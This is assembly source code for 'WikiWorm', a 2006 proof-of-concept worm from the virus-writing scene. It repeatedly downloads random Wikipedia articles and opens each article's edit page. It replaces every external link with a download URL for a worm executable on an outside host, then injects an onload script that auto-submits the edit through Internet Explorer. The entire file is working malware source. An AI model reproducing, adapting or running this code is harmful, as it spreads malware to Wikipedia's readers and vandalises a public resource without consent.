;;;;;;;;;;;;;;;;;;;;;;;;;;;;[WikiWorm];;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; WikiWorm
;; by Second Part To Hell
;; www.spth.de.vu
;; spth@priest.com
;; written in May 2006
;;
;; This is the probably first malware which uses wikipedia for
;; spreading. It downloads a random article, searchs the title
;; of the article, downloads the article's edit page, changes
;; all external wiki links to a worm-download-page, and opens
;; the HTML file.
;;
;; This is a simple POC version - but imagine the virus would
;; create a HTTP-server at the victims computer and change the
;; links to the IP ('http://127.0.0.1/worm.exe' - for example).
;;
;; More information about wikipedia, see my article in rRlf#7.
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;[WikiWorm];;;;;;;;;;;;;;;;;;;;;;;;;;;;
include '..\FASM\INCLUDE\win32ax.inc'

	URLWormDownload 	equ 52
	onLoadStringLen 	equ 68
	methodpostlen		equ 22
	VirtualAllocSize	equ 0x80000
	MethodChangeSize	equ 23
	InetLength		equ 34
	szFileNameLength	equ 15
.data
	memory_alloc	dd 0x0
	memory_alloc2	dd 0x0
	szURL		db 'http://en.wikipedia.org/wiki/Special:Random', 0x0
	szFileName	db 'downloaded.html', 0x0
	hArticleF	dd 0x0
	ddArticleSize	dd 0x0
	hArticleMap	dd 0x0
	hArticleMapView dd 0x0
	ArticleNameSt	dd 0x0
	ArticleNameLen	dd 0x0


	EditLinkStart	db 'http://en.wikipedia.org/w/index.php?title='
	EndEditLinkStart:

	EditLinkEnd	db '&action=edit'
	EndEditLinkEnd:

	URLtoWormDownload	db 'http://people.freenet.de/artistsroom/information.exe'

	LinkStart	dd 0x0
	LinkEnd 	dd 0x0
	LinkSize	dd 0x0

	onLoadString	db '<body ONLOAD="window.setTimeout(',39,'document.editform.submit()',39,', 1 );">'
	BodyDest	dd 0x0
	BodySize	dd 0x0
	FALSE_F 	dd 0x0

	methodpostURL	db 'method="post" action="'
	MethodFound	dd 0x0
	MethPointer	dd 0x0


	program_dir_reg_subkey	db 'SOFTWARE\Microsoft\Windows\CurrentVersion',0x0
	program_dir_reg_value	db 'ProgramFilesDir',0x0
	reg_handle		dd 0x0
	reg_value_type		dd 0x0
	reg_buffer_size 	dd 0x25
	reg_buffer:  times 0x25 db 0x0			; Program-Dir-Buffer
	ProgramDirLength	dd 0x0
	InetPath		db '\Internet Explorer\iexplore.exe" "'


STARTUPINFO_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0
; end STARTUPINFO

PROCESS_INFORMATION_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
; end PROCESS_INFORMATION


.code
start:
	invoke	MessageBox, 0x0, "Don't worry - be happy! :)", "Artwork by Second Part To Hell/rRlf", 0x0

	call	ReserveMemory			; Reserve 512KB Memory
	mov	[memory_alloc], eax

	call	ReserveMemory			; Reserve 512KB Memory
	mov	[memory_alloc2], eax

wiki_main_loop:
	mov	eax, szURL
	call	DownloadFile			; Download the File, URL in eax

	call	MapViewFile			; Create a MapView of szFileName

	call	SearchArticleName		; Search the full name of the article

	call	MakeEditName			; Make the Edit-Name of the article

	call	MakeEditLink			; Make the Edit-Link of the article

	call	CloseMapFile			; Close the MapView and the File

	mov	eax, [memory_alloc]
	call	DownloadFile			; Download the file, URL in eax

	call	MapViewFile			; Create a MapView of szFileName

	call	ContentToVirtualAlloc		; Copy the MapView to the Virtual Alloc

	call	CloseMapFile			; Close the MapView and the File

	call	SearchExternalLink		; Searchs and changes external wiki links
						; searchs for '[htt' and '[ftp'

	call	GenBodyOnLoad			; Make the onload-part

	call	ChangePostMethod		; Change the relative URL of the post-php to a static

	call	WriteContentToFile		; Write the manipulated content to the file

	call	ExecuteHTMLPage 		; Open the file now, to save the changes at wikipedia

	call	EmptyBuffers			; Fill Buffers with 0x0

jmp	wiki_main_loop

signation db 'POC'

ReserveMemory:
	invoke	VirtualAlloc, \ 		; Reserve Memory
		0x0, \
		VirtualAllocSize, \		; 512 KB RAM
		0x1000, \
		0x4
ret

DownloadFile:
; In: eax=URL
	invoke	URLDownloadToFile, \			; Download a random article
		NULL, \
		eax, \
		szFileName, \
		NULL, \
		NULL

	invoke	Sleep, \				; 2.5seconds for downloading should be enough
		2500
ret

MapViewFile:
	invoke	CreateFile, \				; Open the file
		szFileName, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	mov	[hArticleF], eax		; Save the handle

	cmp	eax, INVALID_HANDLE_VALUE
	je	Lwiki_main_loop 		; If anything does not work, begin again


	invoke	GetFileSize, \			; Get the Filesize of the file
		[hArticleF], \
		ddArticleSize

	mov	[ddArticleSize], eax

	invoke	CreateFileMapping, \		; Create a Map of the File
		[hArticleF], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[ddArticleSize], \
		0x0

	mov	[hArticleMap], eax

	invoke	MapViewOfFile, \		; Create a MapViewOfFile
		[hArticleMap], \
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[ddArticleSize]

	mov	[hArticleMapView], eax
ret

CloseMapFile:
	invoke	UnmapViewOfFile, \		; Close MapView
		[hArticleMapView]

	invoke	CloseHandle, \			; Close FileMapping
		[hArticleMap]

	invoke	CloseHandle, \			; Close File
		[hArticleF]
ret

Lwiki_main_loop:
	pop	eax		; Trash
jmp	wiki_main_loop

SearchArticleName:
	mov	eax, [hArticleMapView]
	add	eax, 445			; Bytes which are before the title (HTML stuff) - excl. meta-keywords

   SearchArticleNameLoop:
	inc	eax
	mov	ebx, [eax]
	cmp	ebx, '<tit'			; Articlename by HTML-tag '<title>'
   jne	SearchArticleNameLoop			; <title>Anarchism - Wikipedia, the free encyclopedia</title>

	add	eax, 7
	mov	[ArticleNameSt], eax

   SearchArticleNameEnd:
	inc	eax
	mov	ebx, [eax]
	cmp	ebx, ' - W'			; End of the article name=' - W'
   jne	SearchArticleNameEnd

	mov	byte [eax], 0x0
	sub	eax, [ArticleNameSt]
	mov	[ArticleNameLen], eax
ret

MakeEditName:
	mov	ecx, [ArticleNameLen]

   MakeEditNameLoop:
	mov	eax, [ArticleNameSt]
	add	eax, ecx
	cmp	byte [eax], ' '
      jne     MENL
	mov   byte [eax], '_'			; Change every <space> to '_', as wikipedia uses underlines
      MENL:					; instead of <space> for internal links.
   loop MakeEditNameLoop
ret

MakeEditLink:
	mov	eax, [memory_alloc]

	mov	esi, EditLinkStart
	mov	edi, eax
	mov	ecx, EndEditLinkStart-EditLinkStart
	rep	movsb

	add	eax, EndEditLinkStart-EditLinkStart

	mov	esi, [ArticleNameSt]
	mov	edi, eax
	mov	ecx, [ArticleNameLen]
	rep	movsb

	add	eax, [ArticleNameLen]

	mov	esi, EditLinkEnd
	mov	edi, eax
	mov	ecx, EndEditLinkEnd-EditLinkEnd
	rep	movsb
ret

ContentToVirtualAlloc:
	mov	esi, [hArticleMapView]
	mov	edi, [memory_alloc]
	mov	ecx, [ddArticleSize]
	rep	movsb
ret

SearchExternalLink:
	mov	eax, [memory_alloc]
	add	eax, 5050			; The content infront of the text-area.

   SearchLinkLoop:
	inc	eax
	cmp	dword [eax], '[htt'		; Search an external link (HTTP)
	je	FoundLink
	cmp	dword [eax], '[ftp'		; Search an external link (FTP)
	je	FoundLink
	cmp	byte [eax], 0x0
   jne	SearchLinkLoop
ret

FoundLink:
	mov	[LinkStart], eax
	inc	[LinkStart]
	xor	ebx, ebx
   SearchEndLinkLoop:
	inc	eax
	inc	ebx
	cmp	byte [eax], ' ' 		; [http://www.rrlf.de.vu/ Linkname] ?
	je	FoundEndLink
	cmp	byte [eax], ']' 		; [http://www.rrlf.de.vu/] ?
	je	FoundEndLink
	cmp	ebx, 0x100			; Longer than 255? Maybe mistake in wiki-article.
   jl	SearchEndLinkLoop

	mov	eax, [LinkStart]
jmp	SearchLinkLoop

FoundEndLink:
	mov	[LinkEnd], eax

	mov	[LinkSize], eax
	mov	eax, [LinkStart]
	sub	[LinkSize], eax

	mov	esi, [LinkEnd]			; From Linkend
	mov	edi, [memory_alloc2]

	mov	ecx, [ddArticleSize]
	sub	ecx, [LinkEnd]
	add	ecx, [memory_alloc]

	rep	movsb				; Write the content after the link to the new destination (relative)

	mov	esi, [memory_alloc2]

	mov	edi, [LinkEnd]			; To new destination (LinkEnd-(LinkSize-URLWormDownload))
	sub	edi, [LinkSize]
	add	edi, URLWormDownload

	mov	ecx, [ddArticleSize]
	sub	ecx, [LinkEnd]
	add	ecx, [memory_alloc]
	rep	movsb

	mov	eax, [LinkSize]
	sub	eax, URLWormDownload
	add	[ddArticleSize], eax

	mov	esi, URLtoWormDownload
	mov	edi, [LinkStart]
	mov	ecx, URLWormDownload
	rep	movsb				; Replace the old URL with the worm-download URL

	mov	eax, [LinkStart]
jmp	SearchLinkLoop

GenBodyOnLoad:
	mov	eax, [memory_alloc]
   SearchBody:
	inc	eax
	cmp	dword [eax], '<bod'		; Search the body tag
   jne	SearchBody

	mov	[BodyDest], eax

   SearchEndBody:
	inc	eax
	cmp	byte [eax], '>' 		; End of body tag
   jne	SearchEndBody

	sub	eax, [BodyDest]
	inc	eax
	mov	[BodySize], eax

	mov	ecx, [ddArticleSize]
	sub	ecx, [BodySize]
	sub	ecx, [BodyDest]
	add	ecx, [memory_alloc]

	xor	ebx, ebx
   MakeOnLoadBufferLoop:
	mov	esi, [memory_alloc]
	add	esi, [ddArticleSize]
	sub	esi, ebx

	mov	edi, esi
	add	edi, 68

	mov	al, byte [esi]
	mov	byte [edi], al
	inc	ebx
   loop MakeOnLoadBufferLoop

	mov	eax, [ddArticleSize]
	add	eax, onLoadStringLen
	sub	eax, [BodySize]
	mov	[ddArticleSize], eax

	mov	esi, onLoadString
	mov	edi, [BodyDest]
	mov	ecx, onLoadStringLen
	rep	movsb

ret

WriteContentToFile:

	invoke	CreateFile, \				; Open the file
		szFileName, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	mov	[hArticleF], eax		; Save the handle

	invoke	WriteFile, \
		[hArticleF], \
		[memory_alloc2], \
		[ddArticleSize], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \
		[hArticleF]
ret

ChangePostMethod:
	mov	eax, [memory_alloc]			; Change the relative ('/w/index.php'...) to
   FindPostMethodLoop:					; ('http://en.wikipedia.org/w/index.php'...)
	inc	eax
	cmp	dword [eax], 'meth'
	je	FoundAValue
	mov	ebx, [memory_alloc]
	add	ebx, VirtualAllocSize
	cmp	eax, ebx
   jl	FindPostMethodLoop
ret

FoundAValue:
	mov	[MethodFound], eax
	mov	ecx, methodpostlen-1

     CheckValue:
	mov	eax, [MethodFound]
	add	eax, ecx

	mov	ebx, methodpostURL
	add	ebx, ecx
	mov	al, byte [eax]
	cmp	al, byte [ebx]
	jne	NotRightValuePost
     loop CheckValue

	add	[MethodFound], methodpostlen

	mov	esi, [memory_alloc]
	mov	edi, [memory_alloc2]
	mov	ecx, [MethodFound]
	sub	ecx, [memory_alloc]
	mov	[MethPointer], ecx
	rep	movsb


	mov	esi, EditLinkStart
	mov	edi, [MethPointer]
	add	edi, [memory_alloc2]
	mov	ecx, 23
	rep	movsb

	add	[MethPointer], MethodChangeSize

	mov	esi, [MethodFound]
	mov	edi, [MethPointer]
	add	edi, [memory_alloc2]
	mov	ecx, [ddArticleSize]
	add	ecx, [memory_alloc]
	sub	ecx, [MethodFound]
	rep	movsb

ret

NotRightValuePost:
	mov	eax, [MethodFound]
jmp	FindPostMethodLoop

ExecuteHTMLPage:
	invoke	RegOpenKeyEx, \ 		; Open the reg-key for getting the ProgramDir-Path
		HKEY_LOCAL_MACHINE, \
		program_dir_reg_subkey, \
		0x0, \
		KEY_ALL_ACCESS, \
		reg_handle

	invoke	RegQueryValueEx, \		; Read the info
		[reg_handle], \
		program_dir_reg_value, \
		0x0, \
		reg_value_type, \
		reg_buffer, \
		reg_buffer_size

	invoke	RegCloseKey, \					; Close reg-key
		[reg_handle]

	mov	eax, [memory_alloc]
	mov	byte [eax], '"'

	mov	eax, reg_buffer
   SearchEndOfProgramDir:
	inc	eax
	cmp	byte [eax], 0x0
   jne	SearchEndOfProgramDir

	sub	eax, reg_buffer
	mov	[ProgramDirLength], eax

	mov	esi, reg_buffer
	mov	edi, [memory_alloc]
	inc	edi
	mov	ecx, [ProgramDirLength]
	rep	movsb

	inc	[ProgramDirLength]

	mov	esi, InetPath
	mov	edi, [memory_alloc]
	add	edi, [ProgramDirLength]
	mov	ecx, InetLength
	rep	movsb

	add	[ProgramDirLength], InetLength

	mov	eax, [ProgramDirLength]
	add	eax, [memory_alloc]

	invoke	GetCurrentDirectory, \
		0x255, \
		eax

	mov	eax, [ProgramDirLength]
	add	eax, [memory_alloc]

   SearchEndOfCurrentDir:
	inc	eax
	cmp	byte [eax], 0x0
   jne	SearchEndOfCurrentDir

	mov	[ProgramDirLength], eax
	mov	byte [eax], '\'
	inc	[ProgramDirLength]

	mov	esi, szFileName
	mov	edi, [ProgramDirLength]
	mov	ecx, szFileNameLength
	rep	movsb

	mov	eax, [ProgramDirLength]
	add	eax, szFileNameLength
	mov	byte [eax], '"'

	inc	eax
	mov	byte [eax], 0x0

	invoke	CreateProcess, \			; Execute the extrac32-string
		0x0, \					; Now the extracted version of the victim is in the temp-direcory
		[memory_alloc], \			; '"'+%program-dir%+'\Internet Explorer\iexplore.exe" "'+%current-dir%+'\downloaded.html"'
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUPINFO_struct, \
		PROCESS_INFORMATION_struct

	invoke	Sleep, \
		2500
ret

EmptyBuffers:
	mov	ecx, VirtualAllocSize -1
    EmptyBuffersLoop:
	mov	eax, [memory_alloc]
	add	eax, ecx
	mov	byte [eax], 0x0
	mov	eax, [memory_alloc2]
	add	eax, ecx
	mov	byte [eax], 0x0
    loop EmptyBuffersLoop
ret
 .end start